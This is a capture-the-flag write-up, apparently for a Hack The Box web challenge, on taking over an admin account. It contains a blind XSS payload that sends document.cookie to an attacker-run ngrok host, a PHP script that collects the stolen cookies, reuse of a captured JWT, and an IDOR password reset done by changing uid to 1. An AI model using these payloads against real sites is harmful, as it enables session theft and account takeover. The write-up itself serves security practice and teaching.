## Description
"The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?"

Since this is a web challenge so first thing I did is bruteforcing the directories with dirsearch
![dirs](https://user-images.githubusercontent.com/43896992/169715190-b00eb4de-88c4-4694-9639-41721f1d927b.png)

in the login page the default credentials doesn't work, it gives me "INVALID USERNAME OR PASSWORD!" message.

I found a ticket submitting page in the index of the site for reporting issues to the admin
![index](https://user-images.githubusercontent.com/43896992/169715342-651fabfc-2db9-4cfe-bc72-51aa8fd8e5e0.png)

when I type anything it gives me a message says an admin will review my ticket, but unfortunately it doesn't give me any feedback.

first thing that came into my head is it vulnerable to blind xss? can I seal the admin's cookies?, so I started to build the environment for blind xss exploitation to forward the result to my own server.

I made a get.php file that saves the cookies into a jar.txt file
```
<?php
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$fp = fopen('jar.txt' , 'a');
fwrite($fp, $ip.' '.$browser." \n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n");
fclose($fp);
?>
```
then I made a local php server on port 80 with ```php -S localhost:80``` and I tunneled it out to receive the connection from the vulnerable site with ngrok.

I crafted a blind xss payload ```<script> var i = new Image(); i.src="http://MYSITE.ngrok.io/get.php?q="+document.cookie; </script>```
and I acctually recieved a connection on my server

![ngrok](https://user-images.githubusercontent.com/43896992/169716208-7b2ae392-77a7-47c1-b570-8f41fd3bb0be.png)


The jar.txt file wasn't really useful because I already got the admin's cookies from the request but at least it saved it in a file for me
![jwt](https://user-images.githubusercontent.com/43896992/169716399-46748c7f-0fc3-4780-aa88-2c88df50ed0a.png)

**Cookies:**```session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI4NzEzMjB9.iTg4YroMbHGEaFrDZH8k5t4m9hHPN2nEkRQW31HMrvs```

it's a jwt, so I tried to decode it in [jwt.io](https://jwt.io) and it turned out a moderator's cookie
![jwt io](https://user-images.githubusercontent.com/43896992/169716515-b5057b23-3770-4764-8359-10f67058d88a.png)

I injected it and now I'm a moderator
![mod](https://user-images.githubusercontent.com/43896992/169717290-e723c934-478f-4f6b-b7aa-b92819509a7b.png)

but there's nothing useful in the page, I'm not fully privileged; so, I need to escalate my user to admin not just a moderator.

Since this is another user with another session I thought I may now access the 302 pages and this attempt succeeded and it's now 200, I tried to access ```/settings``` and I found a password changing page, now I can grab the endpoint which is responsible for password changing.
![pass](https://user-images.githubusercontent.com/43896992/169717505-081da6de-4ad2-4800-bf10-2e75b1df838e.png)
![modpass](https://user-images.githubusercontent.com/43896992/169717566-408439ef-c4fb-4542-8fed-1e0be60d0671.png)

the endpoint is ```/api/users/update``` with POST method.

I tried to change the jwt ```username``` value to ```admin``` and use it as a cookie but it didn't work
![Ajwt](https://user-images.githubusercontent.com/43896992/169718032-ec4136af-3ede-4255-9404-4ff587bbdf96.png)

then I tried to use it in the paswword resetting request and it didn't work too, it was a poor idea in the first place ..
![Fadmin](https://user-images.githubusercontent.com/43896992/169718195-cab5bb47-ced1-4786-b000-86a708c54d55.png)

I found a parameter ```uid``` that have value ```100```.
mostly in web apps the admin's uid is 1 or 0 so I thought about idor attack, and if it wasn't 1,0 I would bruteforce it with the intruder until I find the admin's uid

So I changed the value of the ```uid``` to ```1``` and it fortunately worked
![adminspass](https://user-images.githubusercontent.com/43896992/169717743-9496fcfc-458d-4e6d-b8a2-768186821608.png)

Then I logged with the new password in the ```/login``` page and I finally got the flag

![flag](https://user-images.githubusercontent.com/43896992/169717857-c7672396-c9ed-48db-bb52-d2cf2062d701.png)
<sub>it was in the ```/admin``` page but it was unaccessable unless you're the admin</sub>
### ```HTB{x55_4nd_id0rs_ar3_fun!!}```
